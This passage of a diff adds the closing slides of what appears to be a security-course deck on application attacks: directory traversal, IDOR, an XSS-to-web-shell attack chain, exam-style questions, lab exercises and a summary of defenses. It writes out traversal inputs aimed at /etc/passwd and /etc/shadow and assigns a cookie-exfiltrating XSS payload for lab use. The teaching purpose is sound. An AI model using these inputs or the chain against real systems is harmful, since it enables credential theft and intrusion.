+                <span class="fact-text">The image viewer accepts a path parameter. Attacker submits <code>../../etc/passwd</code>. Attack: Directory traversal. Failed control: path canonicalization. Remediation: resolve canonical path before access; verify it starts with the permitted base directory.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">5</span>
+                <span class="fact-text">A standard researcher account accesses /admin/users/ by typing the URL directly. Attack: Broken access control (vertical privilege escalation). Failed control: server-side authorization on admin endpoints. Remediation: enforce authorization checks server-side on every request to privileged endpoints.</span>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 32 -- ATTACK CHAIN ANALYSIS ==================== -->
+<section class="slide" id="slide-32">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 32 of 35</div>
+        <div class="slide-title">Attack <span class="accent">Chain Analysis</span></div>
+        <div class="slide-subtitle">Real attacks combine multiple vulnerabilities. No single class exists in isolation -- each opens the door for the next.</div>
+
+        <div class="box box-blue" style="margin-bottom:4px;">
+            <div class="box-label">Example Full Attack Chain</div>
+            Reflected XSS in a search parameter steals the admin's session cookie. Session cookie used to access the admin panel. Admin panel has an unrestricted file upload. Web shell uploaded. Web shell provides OS command execution. OS command execution reveals database credentials in a config file. Database accessed with credentials -- full data exfiltration. Each vulnerability alone was partially defended; chained, they were catastrophic.
+        </div>
+
+        <div class="card-grid">
+            <div class="card c-red">
+                <div class="card-label">Initial Access</div>
+                <div class="card-desc">The first vulnerability exploited to gain any foothold: SQLi bypassing auth, XSS stealing a session, a phishing link installing malware, an exposed admin panel with default credentials. Initial access determines the attacker's starting privilege level and the attack surface available for post-exploitation.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Lateral Movement and Escalation</div>
+                <div class="card-desc">From the initial foothold, the attacker expands: IDOR to access other accounts, privilege escalation to gain admin rights, SSRF to reach internal services, command injection to pivot to the OS. Defense in depth must break the chain at each step -- not just at initial access. Multiple independent barriers matter.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Defense in Depth Breaks Chains</div>
+                <div class="card-desc">Fix the XSS and the session cookie is never stolen. Set HttpOnly and the stolen cookie is useless. Remove unrestricted file upload and the web shell cannot be planted. Separate the web server from the database network and the credential theft has no path. Each independent fix breaks a link in the chain. Full chains only succeed when defenses are absent at every layer.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 33 -- SY0-701 SCENARIO PRACTICE ==================== -->
+<section class="slide" id="slide-33">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 33 of 35</div>
+        <div class="slide-title">SY0-701 <span class="accent">Scenario Practice</span></div>
+        <div class="slide-subtitle">Apply the attack taxonomy to exam-style questions. Identify attack type, CIA pillar violated, and correct defense.</div>
+
+        <div class="summary-facts">
+            <div class="fact-row">
+                <span class="fact-num">1</span>
+                <span class="fact-text">A user reports that after visiting a forum, they were logged out of their bank account. The forum allowed HTML in posts. Which attack type, and what cookie attribute would have prevented the token theft? <strong>(Stored XSS; HttpOnly flag prevents document.cookie access)</strong></span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">2</span>
+                <span class="fact-text">An attacker uses a crafted URL to make an authenticated user's browser submit a password change request. Which attack, and which server-side control prevents it? <strong>(CSRF; CSRF token validation on state-changing requests)</strong></span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">3</span>
+                <span class="fact-text">A legacy C daemon crashes when it receives 300 bytes of input for a 256-byte buffer. The crash log shows EIP was overwritten. Which attack class and which OS mitigation randomizes the memory layout? <strong>(Buffer overflow; ASLR)</strong></span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">4</span>
+                <span class="fact-text">An attacker submits <code>../../../../etc/shadow</code> as a filename parameter and receives the system password file. Which attack, and what is the correct fix at the code level? <strong>(Directory traversal; resolve canonical path and verify it falls within the allowed base directory)</strong></span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">5</span>
+                <span class="fact-text">A standard user changes a URL parameter from <code>user_id=5001</code> to <code>user_id=5000</code> and views another user's records. Which attack and which access control principle was violated? <strong>(IDOR / horizontal privilege escalation; server-side per-object authorization check was missing)</strong></span>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 34 -- PRACTICE EXERCISES ==================== -->
+<section class="slide" id="slide-34">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 34 of 35 &nbsp;|&nbsp; Lab Exercises</div>
+        <div class="slide-title">Practice <span class="accent">Exercises</span></div>
+        <div class="slide-subtitle">Complete before the next module. Exercises 3-5 require written responses.</div>
+
+        <div class="summary-facts">
+            <div class="fact-row">
+                <span class="fact-num">1</span>
+                <span class="fact-text">Using a local test environment (DVWA, WebGoat, or Juice Shop), identify and exploit one SQL injection vulnerability. Document the payload used, the query it produced, and the parameterized fix that would prevent it.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">2</span>
+                <span class="fact-text">Using the same environment, identify a reflected XSS vulnerability. Craft a payload that would exfiltrate a cookie value (in the test environment only). Describe the output encoding that would prevent execution.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">3</span>
+                <span class="fact-text">A development team argues that their WAF eliminates the need to fix SQLi in the application code. Write a one-paragraph technical rebuttal explaining why this reasoning is incorrect, with at least two specific bypass techniques.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">4</span>
+                <span class="fact-text">Map the following to their CIA impact: SQLi data exfiltration, XSS session hijacking, buffer overflow with shellcode execution, directory traversal of /etc/shadow, CSRF-triggered account deletion, privilege escalation to root on a database server.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">5</span>
+                <span class="fact-text">Design the secure coding standard for a user profile update endpoint: specify input validation rules, output encoding requirements, authorization checks, logging requirements, and rate limiting parameters. Justify each decision.</span>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 35 -- SUMMARY ==================== -->
+<section class="slide" id="slide-35">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 35 of 35 &nbsp;|&nbsp; Summary</div>
+        <div class="slide-title">Module <span class="accent">Summary</span></div>
+        <div class="slide-subtitle">Application attacks exploit untrusted input, weak authorization, and memory safety failures. Every defense traces back to one principle: validate everything, trust nothing.</div>
+
+        <div class="box box-blue" style="margin-bottom: 4px;">
+            Every attack in this module exploits a gap between what the developer assumed about user input and what the attacker actually submitted. The fix in every case is: validate input rigorously, parameterize data operations, enforce authorization on every request, and apply output encoding for the correct context.
+        </div>
+
+        <div class="section-label">10 Facts to Carry Out of This Lecture</div>
+
+        <div class="summary-facts">
+            <div class="fact-row">
+                <span class="fact-num">1</span>
+                <span class="fact-text">SQL injection: user input concatenated into SQL queries. Fix: parameterized queries and stored procedures. Database least privilege limits damage if exploitation succeeds.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">2</span>
+                <span class="fact-text">XSS types: Stored (persisted in DB), Reflected (in URL/response), DOM-based (client-side only). Defense: output encoding per context, CSP headers, HttpOnly cookies.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">3</span>
+                <span class="fact-text">CSRF forges requests from the victim's authenticated browser. Defense: CSRF tokens, SameSite=Strict cookies. XSS breaks CSRF token defenses -- fix XSS first.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">4</span>
+                <span class="fact-text">Buffer overflows overwrite memory beyond allocated buffers. Defenses: ASLR (randomizes layout), DEP/NX (blocks execution), stack canaries (detects overwrite). Memory-safe languages eliminate the class.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">5</span>
+                <span class="fact-text">Directory traversal uses ../ sequences to escape intended directories. Defense: canonicalize path, verify it starts with the allowed base directory, use chroot.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">6</span>
+                <span class="fact-text">Vertical privilege escalation: low to high privilege. Horizontal: same privilege, different identity (IDOR). Both require server-side authorization checks on every object access.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">7</span>
+                <span class="fact-text">WAFs are compensating controls and detection layers -- not a substitute for fixing application vulnerabilities. They are bypassed regularly; fix the code they are protecting.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">8</span>
+                <span class="fact-text">SSRF exploits the server's ability to make outbound requests. Critical in cloud environments where metadata endpoints expose IAM credentials. Defense: URL allowlisting, block RFC 1918 and link-local ranges.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">9</span>
+                <span class="fact-text">CVSS scores vulnerabilities 0-10. Critical (9-10), High (7-8.9), Medium (4-6.9), Low (0.1-3.9). Combine CVSS with asset criticality and exploit availability for real-world prioritization.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">10</span>
+                <span class="fact-text">Real attacks chain vulnerabilities. Defense in depth that breaks any single link in the chain prevents the full compromise. No single control is sufficient; independent layers at each tier are required.</span>
+            </div>
+        </div>
+
+        <div style="text-align:center; margin-top:6px;">
+            <button id="complete-btn" onclick="completeModule()">Mark Complete</button>
+        </div>
+    </div>
+</section>
+
+<!-- Bottom nav -->
+<nav id="nav-bar">
+    <a href="../index.html" style="text-decoration:none;">
+        <button class="nav-btn back-btn">&larr; Infosec</button>
+    </a>
+    <button class="nav-btn" id="prev-btn" onclick="goToSlide(currentSlide - 1)" disabled>Previous</button>
+    <span id="slide-counter">Slide 1 of 35</span>
+    <button class="nav-btn" id="next-btn" onclick="goToSlide(currentSlide + 1)">Next</button>
+</nav>
+
+<script>
+    let currentSlide = 1;
+    const TOTAL_SLIDES = 35;
+
+    function goToSlide(n) {
+        if (n < 1 || n > TOTAL_SLIDES) return;
+        const prev = document.getElementById('slide-' + currentSlide);
+        if (prev) prev.classList.remove('active');
+        currentSlide = n;
+        const next = document.getElementById('slide-' + currentSlide);
+        if (next) next.classList.add('active');
+        document.getElementById('progress-bar').style.width =
+            (currentSlide / TOTAL_SLIDES) * 100 + '%';
+        document.getElementById('slide-counter').textContent =
+            'Slide ' + currentSlide + ' of ' + TOTAL_SLIDES;
+        document.getElementById('prev-btn').disabled = (currentSlide === 1);
+        document.getElementById('next-btn').disabled = (currentSlide === TOTAL_SLIDES);
+        const completeBtn = document.getElementById('complete-btn');
+        if (completeBtn) {
+            completeBtn.style.display = (currentSlide === TOTAL_SLIDES) ? 'inline-block' : 'none';
+        }
+    }
+
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'ArrowRight') { e.preventDefault(); goToSlide(currentSlide + 1); }
+        else if (e.key === 'ArrowLeft') { e.preventDefault(); goToSlide(currentSlide - 1); }
+    });
+
+    goToSlide(1);
+</script>
+
+<script>
+    function completeModule() {
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.complete('shield', 'pis-w2-app-attacks', { returnUrl: '../index.html' });
+        }
+    }
+</script>
+
+<script src="../../../../components/PresentationA11y.js"></script>
+</body>
+</html>
